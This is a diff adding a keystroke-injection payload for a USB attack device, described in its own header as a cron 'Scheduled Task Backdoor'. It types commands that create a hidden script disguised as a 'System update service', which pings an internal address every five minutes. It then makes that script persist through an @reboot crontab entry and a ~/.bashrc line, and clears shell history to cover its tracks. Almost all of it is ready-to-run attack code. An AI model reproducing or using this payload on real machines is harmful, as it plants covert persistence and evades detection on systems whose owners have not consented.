@@ -1,0 +1,68 @@
+# ============================================
+# CRON PERSISTENCE - Scheduled Task Backdoor
+# ============================================
+# Purpose: Establish persistence via cron
+# Author: D3n14l0f53rv1c3
+# Original: https://github.com/i-am-shodan/USBArmyKnife
+# ============================================
+
+DELAY 1000
+
+# Open terminal
+GUI SPACE
+DELAY 500
+STRING terminal
+ENTER
+DELAY 1000
+
+# Create hidden script
+STRING mkdir -p ~/.config/.system
+ENTER
+DELAY 200
+
+STRING cat > ~/.config/.system/.service.sh << 'SCRIPT'
+ENTER
+DELAY 100
+STRING #!/bin/bash
+ENTER
+DELAY 100
+STRING # System update service
+ENTER
+DELAY 100
+STRING while true; do
+ENTER
+DELAY 100
+STRING   ping -c 1 192.168.1.100 2>/dev/null
+ENTER
+DELAY 100
+STRING   sleep 300
+ENTER
+DELAY 100
+STRING done
+ENTER
+DELAY 100
+STRING SCRIPT
+ENTER
+DELAY 300
+
+STRING chmod +x ~/.config/.system/.service.sh
+ENTER
+DELAY 200
+
+# Add to cron
+STRING (crontab -l 2>/dev/null; echo "@reboot ~/.config/.system/.service.sh") | crontab -
+ENTER
+DELAY 300
+
+# Add to bashrc for user persistence
+STRING echo "~/.config/.system/.service.sh &" >> ~/.bashrc
+ENTER
+DELAY 200
+
+STRING history -c
+ENTER
+STRING clear
+ENTER
+
+STRING echo "Persistence established"
+ENTER
